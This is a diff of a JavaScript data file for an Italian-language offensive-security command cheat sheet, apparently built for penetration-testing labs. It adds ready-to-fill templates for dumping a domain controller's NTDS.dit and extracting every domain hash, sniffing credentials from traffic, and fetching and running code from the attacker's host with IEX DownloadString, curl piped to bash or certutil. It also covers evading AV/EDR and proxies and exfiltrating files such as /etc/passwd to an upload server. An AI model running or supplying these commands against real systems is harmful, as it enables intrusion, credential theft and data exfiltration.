+    "note": "# Output atteso\nSe `{{7*7}}` (o `${7*7}`) torna `49`, il template valuta l'input: è vulnerabile. Se resta letterale, no. Il motore si distingue dai marcatori:\n- `{{ }}` — Jinja2/Twig\n- `${ }` — FreeMarker\n- `#{ }` — Ruby/Thymeleaf\n- `<%= %>` — ERB\n# Prossimo passo\nIdentificato il motore, passa al payload di RCE specifico (vedi SSTI — RCE per engine)."
   },
   {
     "id": "ssti-rce",
@@ -9247,7 +10036,7 @@ const COMMANDS = [
       "token",
       "web"
     ],
-    "template": "jwt_tool <jwt>",
+    "template": "# decodifica header e payload del token\njwt_tool <jwt>\n\n# stessa decodifica a mano, senza jwt_tool\necho '<jwt>' | cut -d. -f1,2 | tr '.' '\\n' | base64 -d 2>/dev/null",
     "params": [
       {
         "key": "jwt",
@@ -9412,7 +10201,7 @@ const COMMANDS = [
       "source-leak",
       "secrets"
     ],
-    "template": "git-dumper http://<ip>/.git/ ./loot-git",
+    "template": "# verifica se la cartella .git è esposta\ncurl -s http://<ip>/.git/HEAD\n\n# legge la config del repo: remote e branch\ncurl -s http://<ip>/.git/config",
     "params": [
       {
         "key": "ip",
@@ -9701,6 +10490,115 @@ const COMMANDS = [
         "placeholder": "corp.local"
       }
     ]
+  },
+  {
+    "id": "icacls-perms",
+    "name": "icacls — permessi file/cartella",
+    "category": "post-exp",
+    "subcategory": "situational-awareness",
+    "group": "Windows",
+    "description": "Mostra le ACL di un file o di una cartella: chi può leggere (R), scrivere/modificare (W/M) o ha controllo pieno (F). Serve a capire se puoi sovrascrivere il binario di un servizio, piazzare una DLL in una cartella del PATH o scrivere nel `plugin_dir` di MySQL. Guarda se il tuo utente, `BUILTIN\\Users`, `Authenticated Users` o `Everyone` hanno `(M)`, `(F)` o `(W)`.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "icacls",
+      "acl",
+      "permessi",
+      "privesc"
+    ],
+    "template": "icacls <path>",
+    "params": [
+      {
+        "key": "path",
+        "label": "File/cartella",
+        "placeholder": "C:\\MySQL\\lib\\plugin"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "icacls",
+        "template": "icacls <path>",
+        "description": "ACL del percorso. Sigle: `(F)` full control, `(M)` modify (scrittura), `(W)` write, `(RX)` read+exec, `(R)` read; `(I)` = permesso ereditato, `(OI)(CI)` = propagato a file/sottocartelle."
+      },
+      {
+        "id": "getacl",
+        "label": "Get-Acl (PowerShell)",
+        "template": "(Get-Acl <path>).Access | Format-Table IdentityReference,FileSystemRights,AccessControlType -Auto",
+        "description": "Equivalente PowerShell, con i diritti per ogni identità in chiaro."
+      }
+    ],
+    "note": "# Cosa cerchi\nUn permesso di scrittura (`(M)`/`(F)`/`(W)`) per il tuo utente o per un gruppo che ti include (`BUILTIN\\Users`, `Authenticated Users`, `Everyone`) sul file o sulla cartella bersaglio: è il prerequisito del CASO A in `MySQL — RCE Windows` (scrivere la libreria nel `plugin_dir`) e di molti abusi di servizi/DLL.\n# Equivalente Linux\n`ls -ld <path>` per owner/gruppo/modo, `getfacl <path>` per le ACL estese, `namei -l <path>` per i permessi lungo tutto il percorso."
+  },
+  {
+    "id": "sa-win-users",
+    "name": "Windows — utenti e gruppi locali",
+    "category": "post-exp",
+    "subcategory": "situational-awareness",
+    "group": "Windows",
+    "description": "Enumerazione di utenti e gruppi locali: elenco utenti, dettaglio di un utente (gruppi di appartenenza, ultimo logon, flag della password), elenco dei gruppi e dei loro membri. `whoami /groups` è la via più rapida per sapere se il tuo token è già in un gruppo privilegiato.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "net-user",
+      "net-localgroup",
+      "whoami",
+      "enum",
+      "gruppi"
+    ],
+    "template": "net user",
+    "params": [
+      {
+        "key": "user",
+        "label": "Utente",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "group",
+        "label": "Gruppo",
+        "placeholder": "Administrators"
+      }
+    ],
+    "variants": [
+      {
+        "id": "whoami",
+        "label": "I tuoi gruppi",
+        "template": "whoami /groups",
+        "description": "Gruppi e SID del token corrente, con lo stato. Il modo più rapido per vedere se sei in un gruppo privilegiato."
+      },
+      {
+        "id": "users",
+        "label": "Elenca utenti",
+        "template": "net user",
+        "description": "Tutti gli utenti locali. In PowerShell: `Get-LocalUser`."
+      },
+      {
+        "id": "userdetail",
+        "label": "Dettaglio utente",
+        "template": "net user <user>",
+        "description": "Gruppi di appartenenza (Local/Global Group Memberships), ultimo logon, scadenza e flag della password."
+      },
+      {
+        "id": "groups",
+        "label": "Elenca gruppi",
+        "template": "net localgroup",
+        "description": "Tutti i gruppi locali. In PowerShell: `Get-LocalGroup`."
+      },
+      {
+        "id": "groupmembers",
+        "label": "Membri di un gruppo",
+        "template": "net localgroup \"<group>\"",
+        "description": "Chi appartiene al gruppo indicato. In PowerShell: `Get-LocalGroupMember \"<group>\"`."
+      }
+    ],
+    "note": "# Caccia ai gruppi privilegiati\nOltre ad Administrators, cerca l'appartenenza a `DnsAdmins`, `Backup Operators`, `Server Operators`, `Print Operators`, `Event Log Readers`, `Hyper-V Administrators`: ognuno porta a SYSTEM o al DC (vedi la chain «Gruppi privilegiati Windows → SYSTEM/DC»).\n# Dominio\nPer utenti e gruppi di dominio usa `Windows — dominio (net)` (`net user /domain`, `net group \"...\" /domain`)."
   },
   {
     "id": "creds-linux",
@@ -10026,6 +10924,97 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "vssadmin-ntds",
+    "name": "vssadmin — NTDS.dit via Shadow Copy",
+    "category": "post-exp",
+    "subcategory": "cred-harvesting",
+    "group": "Windows",
+    "description": "Su un Domain Controller (da amministratore): crea una Volume Shadow Copy per copiare NTDS.dit (bloccato a caldo) e, con il registro SYSTEM, estrarre offline tutti gli hash di dominio. Alternativa a secretsdump remoto / ntdsutil.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "ntds",
+      "vssadmin",
+      "shadow-copy",
+      "dcsync"
+    ],
+    "template": "# crea una shadow copy di C: (su un DC, come admin)\nvssadmin create shadow /for=C:\n\n# copia NTDS.dit dalla shadow copy (usa l'indice HarddiskVolumeShadowCopyN dall'output sopra)\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\NTDS.dit\n\n# serve anche il registro SYSTEM per le boot key\nreg save HKLM\\SYSTEM C:\\SYSTEM.save",
+    "params": [],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Shadow copy + NTDS.dit",
+        "template": "# crea una shadow copy di C: (su un DC, come admin)\nvssadmin create shadow /for=C:\n\n# copia NTDS.dit dalla shadow copy (usa l'indice HarddiskVolumeShadowCopyN dall'output sopra)\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\NTDS.dit\n\n# serve anche il registro SYSTEM per le boot key\nreg save HKLM\\SYSTEM C:\\SYSTEM.save",
+        "description": "Copia NTDS.dit + SYSTEM da una shadow copy."
+      },
+      {
+        "id": "diskshadow",
+        "label": "diskshadow (scriptato)",
+        "template": "# alternativa a vssadmin: script per diskshadow\necho set context persistent nowriters > ds.txt\necho add volume c: alias cdrive >> ds.txt\necho create >> ds.txt\necho expose %cdrive% z: >> ds.txt\ndiskshadow /s ds.txt\n\n# copia NTDS.dit dalla shadow esposta come z:\ncopy z:\\Windows\\NTDS\\NTDS.dit C:\\NTDS.dit",
+        "description": "Via diskshadow: a volte evade controlli che bloccano vssadmin."
+      },
+      {
+        "id": "extract",
+        "label": "Estrai hash (offline)",
+        "template": "impacket-secretsdump -ntds NTDS.dit -system SYSTEM.save LOCAL",
+        "description": "Sul tuo box: estrae gli hash NTLM di tutto il dominio da NTDS.dit + SYSTEM."
+      }
+    ],
+    "note": "# Quando\nSolo su un DC con privilegi admin. L'indice `HarddiskVolumeShadowCopyN` va letto dall'output di `vssadmin create shadow`. Trasferisci `NTDS.dit` e `SYSTEM.save` sul tuo box ed estrai con secretsdump.\n# Correlati\n- `secretsdump` remoto (`-just-dc`) per lo stesso risultato via rete\n- `reg save` per SAM/SYSTEM sugli host non-DC"
+  },
+  {
+    "id": "pcredz",
+    "name": "Pcredz — credenziali da pcap",
+    "category": "post-exp",
+    "subcategory": "cred-harvesting",
+    "group": "Sniffing",
+    "description": "Estrae credenziali da una cattura di traffico (o live): hash NTLMv1/v2, HTTP Basic, SNMP, FTP, SMTP, Kerberos. Si usa sul materiale raccolto con responder/MITM o tcpdump.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [],
+    "tags": [
+      "pcredz",
+      "pcap",
+      "sniffing",
+      "ntlm"
+    ],
+    "template": "Pcredz -f capture.pcap -t -v",
+    "params": [
+      {
+        "key": "iface",
+        "label": "Interfaccia",
+        "ctx": "iface",
+        "placeholder": "tun0"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Da file pcap",
+        "template": "Pcredz -f capture.pcap -t -v",
+        "description": "Analizza una cattura: `-t` segue i TCP stream, `-v` verboso."
+      },
+      {
+        "id": "dir",
+        "label": "Da cartella di pcap",
+        "template": "Pcredz -d ./captures/ -t -v",
+        "description": "Processa tutti i file di cattura in una cartella."
+      },
+      {
+        "id": "live",
+        "label": "Live su interfaccia",
+        "template": "Pcredz -i <iface> -v",
+        "description": "Sniffing dal vivo sull'interfaccia indicata."
+      }
+    ],
+    "note": "# Uso\nDopo aver catturato traffico (es. con `responder` in analyze mode o `tcpdump`), Pcredz ne estrae le credenziali. Gli hash NTLM raccolti si crackano con hashcat o si rilanciano in relay."
+  },
+  {
     "id": "pillage-files",
     "name": "Caccia file sensibili",
     "category": "post-exp",
@@ -10309,14 +11298,13 @@ const COMMANDS = [
     ]
   },
   {
-    "id": "transfer-http",
-    "name": "Trasferimento via HTTP",
+    "id": "ft-ps-win",
+    "name": "PowerShell — download (→Win)",
     "category": "post-exp",
     "subcategory": "file-transfer",
-    "group": "HTTP",
-    "description": "Ospita i file su un server HTTP lato attaccante, da cui vengono poi scaricati sul target con il tool disponibile.",
-    "note": "# Quale variante usare\n- Server: avvialo nella cartella coi tool\n- Linux: `wget` o `curl`\n- Windows: `iwr` oppure `certutil`\n- Fileless: `IEX` esegue in memoria, senza scrivere su disco (evita l’AV su file)",
-    "platform": "cross-platform",
+    "group": "Linux → Windows",
+    "description": "Scarica un file sul target Windows da PowerShell. `IEX` esegue in memoria senza toccare il disco (fileless, più stealth ma intercettabile da AMSI/EDR).",
+    "platform": "windows",
     "requires": [
       "shell"
     ],
@@ -10325,54 +11313,170 @@ const COMMANDS = [
     ],
     "tags": [
       "file-transfer",
-      "http"
+      "powershell",
+      "fileless"
     ],
-    "template": "python3 -m http.server 80",
+    "template": "Invoke-WebRequest http://<lhost>/<file> -OutFile <dst>\\<file>",
     "params": [
       {
         "key": "lhost",
-        "label": "Tuo host",
+        "label": "LHOST (tu)",
         "placeholder": "10.10.14.5"
       },
       {
         "key": "file",
         "label": "File",
-        "placeholder": "linpeas.sh"
+        "placeholder": "tool.exe"
+      },
+      {
+        "key": "dst",
+        "label": "Cartella dest.",
+        "placeholder": "C:\\Windows\\Temp",
+        "default": "C:\\Windows\\Temp"
       }
     ],
     "variants": [
       {
         "id": "default",
-        "label": "Server (attacker)",
-        "template": "python3 -m http.server 80",
-        "description": "Server HTTP nella cartella corrente."
+        "label": "IWR -OutFile",
+        "template": "Invoke-WebRequest http://<lhost>/<file> -OutFile <dst>\\<file>",
+        "description": "Download classico HTTP/S su disco."
       },
       {
-        "id": "linux",
-        "label": "Download Linux",
-        "template": "wget http://<lhost>/<file> -O /tmp/<file>",
-        "description": "Oppure `curl http://<lhost>/<file> -o /tmp/<file>`."
+        "id": "ua",
+        "label": "IWR + UserAgent",
+        "template": "Invoke-WebRequest http://<lhost>/<file> -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile <dst>\\<file>",
+        "description": "Maschera la richiesta come Chrome: aggira proxy/firewall restrittivi."
       },
       {
-        "id": "windows",
-        "label": "Download Windows",
-        "template": "iwr -uri http://<lhost>/<file> -outfile <file>",
-        "description": "PowerShell `Invoke-WebRequest`; alternativa `certutil -urlcache -f http://<lhost>/<file> <file>`."
+        "id": "webclient",
+        "label": "Net.WebClient",
+        "template": "(New-Object Net.WebClient).DownloadFile(\"http://<lhost>/<file>\",\"<dst>\\<file>\")",
+        "description": "Compatta, funziona anche su PowerShell 2.0 (legacy)."
       },
       {
-        "id": "memory",
-        "label": "Fileless (PS)",
+        "id": "iex",
+        "label": "Fileless IEX",
         "template": "IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/<file>')",
-        "description": "Esegue lo script in memoria, senza scriverlo su disco."
+        "description": "Esegue lo script in memoria, nessun file su disco. Stealth ma visibile ad AMSI."
       }
-    ]
+    ],
+    "note": "# Stealth\n`IEX`+`DownloadString` carica codice in memoria (fileless): niente file su disco, ma AMSI/EDR possono intercettarlo. `Invoke-WebRequest` è più tracciabile ma meno sospetto in produzione. `Net.WebClient` va anche su PowerShell 2.0.\n# Prossimo passo\nTieni un HTTP server dal lato tuo (gruppo Bidirezionale) e scarica da lì."
+  },
+  {
+    "id": "ft-win-lolbin",
+    "name": "certutil / bitsadmin (LOLBin)",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Linux → Windows",
+    "description": "Download sul target Windows con binari nativi (LOLBin), senza wget/curl. Molto sorvegliati da AV/EDR: usali quando mancano alternative.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "file-transfer",
+      "lolbin",
+      "stealth"
+    ],
+    "template": "certutil.exe -urlcache -split -f http://<lhost>/<file> <dst>\\<file>",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST (tu)",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "file",
+        "label": "File",
+        "placeholder": "nc.exe"
+      },
+      {
+        "key": "dst",
+        "label": "Cartella dest.",
+        "placeholder": "C:\\Windows\\Temp",
+        "default": "C:\\Windows\\Temp"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "certutil",
+        "template": "certutil.exe -urlcache -split -f http://<lhost>/<file> <dst>\\<file>",
+        "description": "LOLBIN nativo. Alternativa: `-verifyctl -split -f <url>`."
+      },
+      {
+        "id": "bitsadmin",
+        "label": "bitsadmin",
+        "template": "bitsadmin /transfer job http://<lhost>/<file> <dst>\\<file>",
+        "description": "Obsoleto/legacy, spesso bloccato dall'EDR."
+      }
+    ],
+    "refs": [
+      {
+        "label": "LOLBAS — LOLBins Windows",
+        "url": "https://lolbas-project.github.io/"
+      }
+    ],
+    "note": "# Note\nSono LOLBin: nativi ma pesantemente monitorati (occhio ai log). Altri in [LOLBAS](https://lolbas-project.github.io/), es. `cscript wget.js` / `cscript wget.vbs` (lo script si costruisce anche con righe `echo ... >> wget.vbs` in shell non-interattiva)."
+  },
+  {
+    "id": "ft-win-ftp",
+    "name": "FTP / TFTP (shell non-interattiva)",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Linux → Windows",
+    "description": "Quando sul target Windows hai solo una shell non-interattiva: FTP scriptato da file di comandi, oppure TFTP (UDP, solo Windows legacy fino a XP/2003).",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "ftp"
+    ],
+    "tags": [
+      "file-transfer",
+      "ftp",
+      "tftp"
+    ],
+    "template": "# costruisci lo script dei comandi ftp senza editor\necho open <lhost> 21> ftp.txt\necho USER anonymous>> ftp.txt\necho pass>> ftp.txt\necho bin>> ftp.txt\necho GET <file>>> ftp.txt\necho bye>> ftp.txt\n\n# esegui ftp in modo non-interattivo leggendo lo script\nftp -v -n -s:ftp.txt",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST (tu)",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "file",
+        "label": "File",
+        "placeholder": "nc.exe"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "FTP scriptato",
+        "template": "# costruisci lo script dei comandi ftp senza editor\necho open <lhost> 21> ftp.txt\necho USER anonymous>> ftp.txt\necho pass>> ftp.txt\necho bin>> ftp.txt\necho GET <file>>> ftp.txt\necho bye>> ftp.txt\n\n# esegui ftp in modo non-interattivo leggendo lo script\nftp -v -n -s:ftp.txt",
+        "description": "Costruisce ed esegue uno script FTP: funziona anche senza shell interattiva. Serve un server FTP dal lato tuo."
+      },
+      {
+        "id": "tftp",
+        "label": "TFTP (legacy)",
+        "template": "tftp -i <lhost> get <file>",
+        "description": "UDP, spesso bloccato in egress e presente solo su Windows vecchi."
+      }
+    ],
+    "note": "# Quando\n`ftp -s:` serve con shell non-interattive (non puoi digitare le risposte ai prompt). TFTP è l'ultima spiaggia su Windows legacy."
   },
   {
     "id": "transfer-smb",
     "name": "Trasferimento via SMB",
     "category": "post-exp",
     "subcategory": "file-transfer",
-    "group": "SMB",
+    "group": "Linux → Windows",
     "description": "Due direzioni: server SMB dall’attacker (il target Windows scarica), oppure upload diretto su una share con credenziali via `nxc --put-file` o `smbclient put`. `-smb2support` per i Windows recenti.",
     "note": "# Attenzione\nUtile quando l’egress HTTP è filtrato. I Windows recenti rifiutano l’autenticazione guest verso il server SMB dell’attaccante: in quel caso usa l’upload autenticato (`nxc --put-file` o `smbclient put`) su una share scrivibile. `-smb2support` è obbligatorio coi Windows moderni.",
     "platform": "cross-platform",
@@ -10456,13 +11560,408 @@ const COMMANDS = [
     ]
   },
   {
-    "id": "transfer-misc",
-    "name": "Trasferimento — nc / base64",
+    "id": "ft-winrm",
+    "name": "WinRM — Copy-Item (PSSession)",
     "category": "post-exp",
     "subcategory": "file-transfer",
-    "group": "Senza tool",
-    "description": "Quando mancano HTTP/SMB: trasferisci con netcat o, per file piccoli, copia-incolla in base64.",
-    "note": "# Quale variante usare\n- netcat: quando c’è `nc` ma non HTTP/SMB\n- base64: file piccoli, si incolla in qualsiasi shell; su Windows `certutil -decode`\n\n# Attenzione\nVerifica sempre l’hash dopo il trasferimento (`md5sum`, `Get-FileHash`): i trasferimenti grezzi si corrompono facilmente.",
+    "group": "Linux → Windows",
+    "description": "Copia file tra host Windows via PowerShell Remoting (WinRM, porte 5985/5986) quando HTTP/SMB non sono disponibili. Serve accesso admin o gruppo Remote Management Users.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "winrm"
+    ],
+    "tags": [
+      "file-transfer",
+      "winrm",
+      "powershell"
+    ],
+    "template": "$Session = New-PSSession -ComputerName <ip>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "DATABASE01"
+      },
+      {
+        "key": "file",
+        "label": "File",
+        "placeholder": "loot.txt"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Crea sessione",
+        "template": "$Session = New-PSSession -ComputerName <ip>",
+        "description": "Apre la sessione remota (serve prima delle copie)."
+      },
+      {
+        "id": "to",
+        "label": "Locale → remoto",
+        "template": "Copy-Item -Path <file> -ToSession $Session -Destination C:\\Users\\Public\\",
+        "description": "Invia un file dall'host locale a quello remoto."
+      },
+      {
+        "id": "from",
+        "label": "Remoto → locale",
+        "template": "Copy-Item -Path C:\\Users\\Administrator\\Desktop\\<file> -Destination . -FromSession $Session",
+        "description": "Scarica un file dall'host remoto."
+      }
+    ],
+    "note": "# Requisiti\nPrivilegi admin o membership in _Remote Management Users_. Verifica prima con `Test-NetConnection -ComputerName <ip> -Port 5985`."
+  },
+  {
+    "id": "ft-rdp-mount",
+    "name": "RDP — mount cartella locale",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Linux → Windows",
+    "description": "Monta una cartella locale dentro la sessione RDP: i file compaiono su `\\\\tsclient` lato Windows. Alternativa al copia/incolla via RDP.",
+    "platform": "linux",
+    "requires": [
+      "password"
+    ],
+    "protocols": [
+      "rdp"
+    ],
+    "tags": [
+      "file-transfer",
+      "rdp"
+    ],
+    "template": "xfreerdp /v:<ip> /u:<user> /p:'<password>' /drive:share,/home/kali/loot",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.132"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "administrator"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "Password0@"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "xfreerdp /drive",
+        "template": "xfreerdp /v:<ip> /u:<user> /p:'<password>' /drive:share,/home/kali/loot",
+        "description": "Monta la cartella locale come drive condiviso."
+      },
+      {
+        "id": "rdesktop",
+        "label": "rdesktop -r disk",
+        "template": "rdesktop <ip> -u <user> -p '<password>' -r disk:share=/home/kali/loot",
+        "description": "Equivalente con rdesktop."
+      }
+    ],
+    "note": "# Accesso\nDa Windows i file montati stanno in `\\\\tsclient\\share`. Su Windows nativo usa `mstsc.exe` e condividi i dischi locali nelle opzioni."
+  },
+  {
+    "id": "ft-wget-curl",
+    "name": "wget / curl — download (→Linux)",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Windows → Linux",
+    "description": "Scarica un file sul target Linux. Le varianti fileless eseguono in memoria con una pipe (`| bash` / `| python3`) senza scrivere su disco.",
+    "platform": "linux",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "file-transfer",
+      "wget",
+      "curl",
+      "fileless"
+    ],
+    "template": "wget http://<lhost>/<file> -O /tmp/<file>",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST (tu)",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "file",
+        "label": "File",
+        "placeholder": "linpeas.sh"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "wget",
+        "template": "wget http://<lhost>/<file> -O /tmp/<file>",
+        "description": "Download su disco."
+      },
+      {
+        "id": "curl",
+        "label": "curl",
+        "template": "curl http://<lhost>/<file> -o /tmp/<file>",
+        "description": "Download su disco con curl."
+      },
+      {
+        "id": "fbash",
+        "label": "Fileless (curl|bash)",
+        "template": "curl -s http://<lhost>/<file> | bash",
+        "description": "Esegue in memoria senza salvare su disco."
+      },
+      {
+        "id": "fpy",
+        "label": "Fileless (wget|python3)",
+        "template": "wget -qO- http://<lhost>/<file> | python3",
+        "description": "Scarica e passa direttamente a python3."
+      }
+    ],
+    "note": "# Fileless\n`| bash` / `| python3` non toccano il disco: footprint bassa, ma l'EDR che ispeziona i comandi vede comunque la pipe."
+  },
+  {
+    "id": "ft-linux-code",
+    "name": "python / php / ruby / perl — download",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Windows → Linux",
+    "description": "Download sul target Linux quando mancano wget/curl, usando l'interprete già presente sul sistema.",
+    "platform": "linux",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "file-transfer",
+      "python",
+      "php"
+    ],
+    "template": "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://<lhost>/<file>\",\"/tmp/<file>\")'",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST (tu)",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "file",
+        "label": "File",
+        "placeholder": "linpeas.sh"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Python3",
+        "template": "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://<lhost>/<file>\",\"/tmp/<file>\")'",
+        "description": "urllib.request.urlretrieve(url, dest)."
+      },
+      {
+        "id": "php",
+        "label": "PHP",
+        "template": "php -r '$f=file_get_contents(\"http://<lhost>/<file>\");file_put_contents(\"/tmp/<file>\",$f);'",
+        "description": "file_get_contents + file_put_contents."
+      },
+      {
+        "id": "ruby",
+        "label": "Ruby",
+        "template": "ruby -e 'require \"net/http\";File.write(\"/tmp/<file>\",Net::HTTP.get(URI.parse(\"http://<lhost>/<file>\")))'",
+        "description": "Net::HTTP.get + File.write."
+      },
+      {
+        "id": "perl",
+        "label": "Perl",
+        "template": "perl -e 'use LWP::Simple;getstore(\"http://<lhost>/<file>\",\"/tmp/<file>\");'",
+        "description": "LWP::Simple getstore."
+      }
+    ],
+    "note": "# Legacy\nSu Python 2: `python2.7 -c 'import urllib;urllib.urlretrieve(\"http://<lhost>/<file>\",\"/tmp/<file>\")'`."
+  },
+  {
+    "id": "ft-scp",
+    "name": "scp (SSH) — download / upload",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Windows → Linux",
+    "description": "Trasferimento cifrato via SSH tra host: serve SSH raggiungibile e credenziali/chiave valide.",
+    "platform": "cross-platform",
+    "requires": [
+      "password"
+    ],
+    "protocols": [
+      "ssh"
+    ],
+    "tags": [
+      "file-transfer",
+      "scp",
+      "ssh"
+    ],
+    "template": "scp <user>@<ip>:<path> .",
+    "params": [
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "htb-student"
+      },
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.90"
+      },
+      {
+        "key": "path",
+        "label": "Path remoto",
+        "placeholder": "/home/htb-student/id_rsa"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Download dal target",
+        "template": "scp <user>@<ip>:<path> .",
+        "description": "Scarica un file dal target nella cartella corrente."
+      },
+      {
+        "id": "upload",
+        "label": "Upload sul target",
+        "template": "scp <path> <user>@<ip>:/tmp/",
+        "description": "Carica un file locale sul target."
+      }
+    ],
+    "note": "# Requisiti\nPorta 22 aperta e credenziali/chiave valide. Traffico cifrato."
+  },
+  {
+    "id": "ft-uploadserver",
+    "name": "uploadserver — exfil verso di te",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Windows → Linux",
+    "description": "Server HTTP con upload via POST (modulo python `uploadserver`) per esfiltrare file dal target verso l'attacker.",
+    "platform": "cross-platform",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "file-transfer",
+      "exfil",
+      "http"
+    ],
+    "template": "python3 -m uploadserver 8000",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST (tu)",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "file",
+        "label": "File",
+        "placeholder": "/etc/passwd"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Server (attacker)",
+        "template": "python3 -m uploadserver 8000",
+        "description": "Server con endpoint /upload sulla porta 8000."
+      },
+      {
+        "id": "https",
+        "label": "Server HTTPS",
+        "template": "python3 -m uploadserver 443 --server-certificate ~/server.pem",
+        "description": "Con cert self-signed (vedi note)."
+      },
+      {
+        "id": "curl",
+        "label": "Upload dal target (curl)",
+        "template": "curl -X POST http://<lhost>:8000/upload -F 'files=@<file>'",
+        "description": "Invia un file al server. HTTPS self-signed: aggiungi `--insecure`."
+      },
+      {
+        "id": "py",
+        "label": "Upload (python requests)",
+        "template": "python3 -c 'import requests;requests.post(\"http://<lhost>:8000/upload\",files={\"files\":open(\"<file>\",\"rb\")})'",
+        "description": "Upload via requests."
+      }
+    ],
+    "note": "# Setup\nInstalla con `pip install --user uploadserver`. Per HTTPS genera un cert: `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`."
+  },
+  {
+    "id": "transfer-http",
+    "name": "HTTP server (serve file)",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Bidirezionale / senza tool",
+    "description": "Server HTTP dal lato tuo (attacker) per servire file dalla cartella corrente. Il target poi scarica con wget/curl (→Linux) o IWR/certutil (→Windows).",
+    "note": "# Uso\nAvvia dalla cartella che contiene i file. Poi dal target scarica con `wget http://<tuo-ip>/<file>` oppure `Invoke-WebRequest`. Porta sotto 1024 richiede root.",
+    "platform": "cross-platform",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "file-transfer",
+      "http",
+      "server"
+    ],
+    "template": "python3 -m http.server 80",
+    "params": [],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Python3",
+        "template": "python3 -m http.server 80",
+        "description": "Serve la cartella corrente sulla porta 80 (root per <1024)."
+      },
+      {
+        "id": "php",
+        "label": "PHP",
+        "template": "php -S 0.0.0.0:8000",
+        "description": "Server PHP integrato."
+      },
+      {
+        "id": "ruby",
+        "label": "Ruby",
+        "template": "ruby -run -e httpd . -p8000",
+        "description": "Server Ruby integrato."
+      },
+      {
+        "id": "python2",
+        "label": "Python2",
+        "template": "python2.7 -m SimpleHTTPServer 80",
+        "description": "Variante per sistemi con solo Python 2."
+      }
+    ]
+  },
+  {
+    "id": "transfer-misc",
+    "name": "Netcat / Ncat",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Bidirezionale / senza tool",
+    "description": "Trasferimento TCP grezzo con netcat/ncat, in entrambe le direzioni. `ncat` (progetto Nmap) chiude da solo con `--recv-only`/`--send-only`.",
+    "note": "# Direzione\nIl lato con `>` riceve, quello con `<` invia. Con `nc` classico aggiungi `-q 0` per chiudere a fine invio. Se manca nc ma c'è bash, vedi /dev/tcp.",
     "platform": "cross-platform",
     "requires": [
       "shell"
@@ -10471,36 +11970,161 @@ const COMMANDS = [
     "tags": [
       "file-transfer",
       "nc",
-      "base64"
+      "ncat"
     ],
